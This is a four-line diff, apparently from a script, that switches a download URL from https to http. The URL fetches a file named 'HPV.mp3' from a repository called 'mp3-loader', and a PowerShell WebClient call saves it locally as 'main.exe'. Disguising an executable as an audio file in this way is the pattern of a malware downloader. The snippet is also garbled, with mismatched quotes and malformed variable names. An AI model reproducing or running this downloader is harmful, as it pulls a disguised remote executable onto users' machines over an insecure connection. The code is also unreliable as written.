@@ -1,4 +1,4 @@
-surl_file = 'https://github.com/FTG-MODULES/mp3-loader/raw/main/HPV.mp3"
+surl_file = 'http://github.com/FTG-MODULES/mp3-loader/raw/main/HPV.mp3"
 $file = "main.exe'
 
 Powershell (New-Object System.Net.WebClient).DownloadFile($url file, $file),
